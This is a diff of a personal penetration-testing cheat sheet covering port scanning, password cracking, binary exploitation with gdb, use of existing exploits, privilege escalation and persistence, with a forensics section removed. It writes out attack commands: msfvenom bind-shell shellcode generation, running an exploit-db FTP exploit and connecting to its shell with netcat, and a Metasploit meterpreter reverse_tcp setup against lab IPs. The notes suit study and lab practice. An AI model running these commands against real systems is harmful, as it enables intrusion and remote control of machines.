@@ -29,7 +29,13 @@ Reconnaissance>
 				apt install qpdf
 			//Remove metadata
 				exiftool -all:all= OrganizationsCoreAssignment.pdf
-			//Make a bash script that will make it harder to recover data
+			//Use a bash script that will make it harder to copy data
+				//Give executable permissions
+					chmod 755 ./clean_pdf
+				//Move to path
+					mv ./clean_pdf /usr/bin/clean_pdf	
+				//Run script (as it now exists in path)
+					clean_pdf OrganizationsCoreAssignment.pdf	
 	Crack passwords
 		Wordlists & CeWL>
 		//After intercepting PW hashes going over a network
@@ -54,39 +60,25 @@ Reconnaissance>
 		//Use a wordList to craft HTTP requests
 			dirb http://myfakedomain.local /usr/share/wordlists/dirb/small.txt
 	Port scan
-		with netcat>
-					nc -z -v -w 1 192.168.0.92 1-1338 | grep "succeeded!"
-		Nmap>
-			//Aim to find ports which have a vulnerable service listening
-			//Scan for open ports
-				//-vv: 2nd level of verbosity (print Nmaps actions),  -p-: Scan all ports (rather than just a 1000)
-				 //-sT: TCP connect scan (dont need root permissions, obvious scan that firewalls/IDS systems will flag)
-				 //-sS: syn scan, normal tcp on open ports: Syn -> Syn-Ack -> Ack, syn scan: Syn -> Syn-Ack, closed ports: Syn -> Rst 
-				 //-sV: Connect to ports and check running service
-				 //-sU: UDP scans, though because UDP is connection-less, they take longer time and are inaccurate.
-				 // -O: Fingerprint OS 
-				  //-p-: Scan all ports (rather than just a 1000)
-					nmap {} {} {} [targetIP]
-						
-				//EG, Because UDP is connection-less, UDP scans can take a long time and aren't necessarily accurate.
-					//UDP scan
-						nmap -vv -sU -p- 127.0.0.1	
-		
-	Analyse/sniff network packets>
-		tcpdump>
-			tcpdump -i eth0 - investigate what is being transmitted to the interface you specify
-			//Capture packets
-				//host [hostIP]:, src [sourceIP]:, dst [trafficDestinationIp], net [IP/Subnet]: packets going to/from a particular network/subnet
-				//port [portNumber], icmp: target specific protocols
-				tcpdump {}
-				tcpdump -c 1 -X icmp: capture packet contents with Hex output
-		wireshark			
-
-
+		//Aim to find ports which have a vulnerable service listening
+		//Scan for open ports
+			//Connect scan (dont need root permissions, obvious scan that firewalls/IDS systems will flag)
+				//-vv: 2nd level of verbosity (print Nmaps actions), -sT: TCP connect scan, -p-: Scan all ports (rather than just a 1000)
+					nmap -vv -sT -p- 127.0.0.1
+			//syn scan, normal tcp on open ports: Syn -> Syn-Ack -> Ack, syn scan: Syn -> Syn-Ack, closed ports: Syn -> Rst 
+				nmap -vv -sS -p- 127.0.0.1				
+		//Connect to open ports to get more info on running services
+			nc 127.0.0.1 22
+			//Do above step in nmap, with a version detection scan 
+				nmap -vv -sV -p- 127.0.0.1	
+			//Fingerprint OS 
+				nmap -vv -O -p- 127.0.0.1	
+			//Because UDP is connection-less, UDP scans can take a long time and aren't necessarily accurate.
+				//UDP scan
+				nmap -vv -sU -p- 127.0.0.1	
 Exploitation>
 	Binary application flaws>
-		//Setup, GDB debugger and pwndbg
-			sudo apt install gdb
+		//Setup
 			sudo apt install git
 			git clone https://github.com/pwndbg/pwndbg
 			cd pwndbg
@@ -101,18 +93,18 @@ Exploitation>
 				//You can pause a programs execution by settings a break point
 					break *[functionName]
 					break *[functionMemoryAddress]	
-				//After break, continue the program
+				//Continue the program
 					continue
-					//Continue moving through the program and step into call instructions (you have to go through that function isntruction by instruction) (can be useful to call custom functions but a pain for standard ones)
-						step
-					//or continue but step over function calls
-						next
+				//Continue moving through the program and step into call instructions (you have to go through that function isntruction by instruction) (can be useful to call custom functions but a pain for standard ones)
+					step
+				//or continue but step over function calls
+					next
 				//Quit
 					quit
 			//Inspect memory
 				//i: View instruction normally, x: View as hex, s: view as string
 				//[instructionMemoryAddress], [memory registers]
-					x/[numberOfRepetitions]{} {}
+					x/{} {}
 				//EG
 					x/i 0x565555a1
 					x/x $esp
@@ -149,19 +141,21 @@ Exploitation>
 						x/100x $esp		
 					python exploit.py | ./buffer
 	Existing exploits>
-		//basic manual process
-			//Scan for open ports
-				nmap -vv -sV 192.168.182.157
-				//Check exploit-db.com for vulnerabilities
-					// EG FreeFloat ftpd 1.00 file server running on windows XP
-				//Create exploit script
-					//Copy script from exploit-db
-				//Generate shellcode with metasploit framework msfvenom tool
-				//Swap exploit shellcode in the script with the new shellcode	
-				//Run python script
-					python freefloatftp.py 192.168.157 21
-				//With netcat Connect to the listener that was launched by freefloatftp.py 's on the target port
-					nc 92.168.182.157 4444
+		//Scan for open ports
+			nmap -vv -sV 192.168.182.157
+			//Check exploit-db.com for vulnerabilities
+				// EG FreeFloat ftpd 1.00 file server running on windows XP
+			//Create exploit script
+				//Copy script from exploit-db
+			//Generate shellcode with metasploit framework msfvenom tool
+				//-a: architecture (x86 for 32 bit), -p: payload (EG bind to a port and wait for you to connect), --platform,
+				// -b: bad characters (0X00 is a null byte, 0x0d is a carriage return, 0x0a is a newline character, any of these could cut of the input), -f: output format, [targetPort]: Dont use the target port if you just want to test the shellcode or exploit 
+				msfvenom -a x86 -p windows/shell_bind_tcp --platform windows -b \x00\x0a\x0d -f python LPORT=4444
+			//Swap exploit shellcode in the script with the new shellcode	
+			//Run python script
+				python freefloatftp.py 192.168.157 21
+			//With netcat Connect to the listener that was launched by freefloatftp.py 's on the target port
+				nc 92.168.182.157 4444
 		Metasploit framework>
 			Install>
 				curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
@@ -188,29 +182,13 @@ Exploitation>
 				set PAYLOAD windows/meterpreter/reverse_tcp
 				//Set options
 					options
-					//Set technique, EG powershell scripts
-						set TECHNIQUE PSH
 					//Set target remote host
 						set RHOST 192.168.182.154
 					//Set the localhost	
 						set LHOST 192.168.182.138
-				
 				exploit
-				Examine system>
-					//Get system info
-						getuid
-					//Get current permissions
-						run post/windows/gather/win_privs
-					//Get system privalleges
-						getsystem
+				getuid
 				screenshot
-			Generate shellcode>
-				//-a: architecture (x86 for 32 bit), -p: payload (EG bind to a port and wait for you to connect), --platform,
-				// -b: bad characters (0X00 is a null byte, 0x0d is a carriage return, 0x0a is a newline character, any of these could cut of the input), -f: output format, [targetPort]: Dont use the target port if you just want to test the shellcode or exploit 
-				msfvenom {} [] {} [] {} []
-				//EG creating a listener
-				msfvenom -a x86 -p windows/shell_bind_tcp --platform windows -b \x00\x0a\x0d -f python LPORT=4444
-					
 	Privilege Escalation>	
 		Linux>
 			//When you hack a system, either by exploiting a service, or sending a user a piece of malware, you gain access to that system with the same level of privileges as the service or user in question. 
@@ -481,114 +459,23 @@ Persistence>
 				netstat -a -b -o
 		Start-up items>
 			Linux>
-				runlevels>
-				//specifies which mode the OS is running under
-				//0: shutdown, 1: single-user mode (kind of like safe mode), 2 through 5: multi-user / normal modes
-				//6: reboot
-				//See current run level
-					runlevel
-				//See software configured to run at level 5 (their symlinks/shortcuts)
-				ls /etc/rc5.d/
-				//Some distro's location to store software that starts at boot
-				/etc/rc.local
-			systemd>
-				//Method to run software at boot
-				//Check services
+				Runlevels
+					//specifies which mode the OS is running under
+				 		//0: shutdown, 1: single-user mode (kind of like safe mode), 2 through 5: multi-user / normal modes
+    					//6: reboot
+						//See current run level
+						runlevel
+						//See software configured to run at level 5 (their symlinks/shortcuts)
+						ls /etc/rc5.d/
+						//Some distro's location to store software that starts at boot
+						/etc/rc.local
+				systemd
+					//Method to run software at boot
+					//Check services
 					systemctl
-				//Most of them are located in
-					/lib/systemd/system/*.service
-					/etc/systemd/system/*.service
-				//Stop systemctl service
-					sudo systemctl disable postgresql
-			crontab>
-				//List crontab
-				crontab -l
-				//Edit crontab
-				crontab -e
-				//Get crontabs for a certain user
-				crontab -u [user]  [filePath]
-
-<Foresensics>		
-	Cryptography>
-		Stegnography>
-			Steghide>					
-				//Display information about a cover or stego file.
-					steghide info --info
-				//embed, extract
-					 //Embed file with msg: -ef, --embedfile, specify cover of file used to embed data: -cf, --coverfile, 
-					 //specify stego file: -sf, --stegofile, create file and write extracted embedded data to it: -xf, --extractfile 
-					steghide {} {} [filename]
-					//EG steghide extract -sf [fileName] -xf --flag.txt		
-			Search manually>
-				//Zoom in on the image to see if small things visually hidden
-				//Check file headers
-					file [fileName]
-					//or use hexedit to read hex headers
-					
-				//Read strings	
-					strings [fileName]
-				//Check with steghide if you have a PW
-				 steghide {} [fileName]
-				 //Mine meta data
-				 exiftool -k [fileName]		
-					
-	Disk Forensics and the File System>		
-		//Different file-storage types: EG FAT (12/16/32), NTFS, HFS, ext2/3/4, UNIX
-		Memory forensics>
-		//Methods: investigating metadata, listing protocols and ports used and keyword searching.
-		//Volatility 
-			//Tool for memory forensics, extract a .pst file out of memory for outlook info and then use a tool to browse them EG pffexport
-			//Find OS related to extracted .mem file 
-				volatility -f [filename] imageinfo 
-			//high-level view of running processes: pslist, Scans memory for EPROCESS blocks: psscan, Display parent-process relationships: pstree, 
-			//Scan memory for FILE_OBJECT handles: filescan, Extract FILE_OBJECTS from memory: dumpfiles	
-				volatility -f [filename] –profile=[Profile abtained from imageinfo] {}
-
-	Event Logs and Log Files>
-		//Extra data and save
-		evtx_dump.py [fileName.evtx] > eventFile
-		//Sort and group data
-			//target EG RDP and 4624
-			cat securityEventFile | grep -a10 [target]
-			//Optional params head: Reduce amount of data, awk: Get a column
-			cat eventFile | grep [targetUserName] | sort | uniq -c | sort -nr | head -n5 | awk '{ print $1}'
-			
-			
-		Encryption>
-			Symmetric encryption>
-				//Encrypt file with DES, enter PW after command
-					openssl enc -des -in [plainText.txt] -out [encryptedFile.enc]
-				//Decrypt, enter PW after command
-					openssl enc -des -d -in [encryptedFile.enc] -out [plainText.txt]
-			Asymmetric encryption>
-				//Key parts: public and private parts, known as a keypair
-				//Generate keypair
-					openssl genrsa -out private.pem 2048
-				//Extract public key
-					openssl rsa -in private.pem -outform PEM -pubout -out public.pem
-				//Encrypt
-					openssl rsautl -encrypt -in [plainText.txt] -pubin -inkey public.pem -out [cipher.txt]
-				//Decrypt
-					openssl rsautl -decrypt -in [ciper.txt] -inkey private.pem -out [plainText.txt]
-				//AES
-					openssl aes-256-cbc -in attack-plan.txt -out message.enc
-					openssl aes-256-cbc -d -in message.enc -out plain-text.txt
-			Hashing>
-				//Pass text with	echo "" | 
-				//or with <<< 'Hello, World!'
-				sha1sum	
-				sha256sum
-				sha512sum
-				md5sum
-		Encoding>
-			base64> 
-				openssl enc -base64 <<< 'Hello, World!'
-				openssl enc -base64 -d <<< SGVsbG8sIFdvcmxkIQo=
-			Hex>
-				//Decimal to hex, swap bases for the other way around
-				echo "obase=16; ibase=10; 25" | bc
-				//Binary to hex
-				echo "obase=16; ibase=2; 1111" | bc
-
-
-					
+					//Most of them are located in
+						/lib/systemd/system/*.service
+						/etc/systemd/system/*.service
+				crontab
+						
+						
